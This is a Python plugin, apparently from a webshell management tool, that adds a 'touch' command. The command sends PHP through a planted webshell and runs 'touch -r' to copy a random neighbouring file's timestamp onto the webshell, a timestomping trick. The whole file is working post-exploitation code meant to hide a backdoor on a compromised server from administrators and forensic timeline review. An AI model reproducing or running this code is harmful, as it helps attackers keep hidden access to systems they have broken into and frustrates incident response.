from libs.config import alias, color
from libs.myapp import send, get_system_code, is_windows


def get_php(filename, command):
    return """$arr = glob("*.*");
$reference = $arr[mt_rand(0, count($arr) - 1)];
$file='%s';
if ($file==''){$file=basename($_SERVER['SCRIPT_NAME']);}
%s
echo $file.' as '.$reference;""" % (filename, command)


@alias(True, func_alias="t", f="filename")
def run(filename: str = ""):
    """
    touch

    (Only for *unix) Specify a file whose modification time stamp is the same as a random file in the current directory.

    eg: touch {filename=this_webshell}
    """
    if (is_windows()):
        print(color.red("Target system is windows."))
        return
    try:
        command = get_system_code("touch -r $reference $file")
        reference = send(get_php(filename, command)).r_text.strip()
        print(color.green(f"Modify time stamp {reference} success."))
    except IndexError:
        print(color.red("all the system execute commands are disabled."))
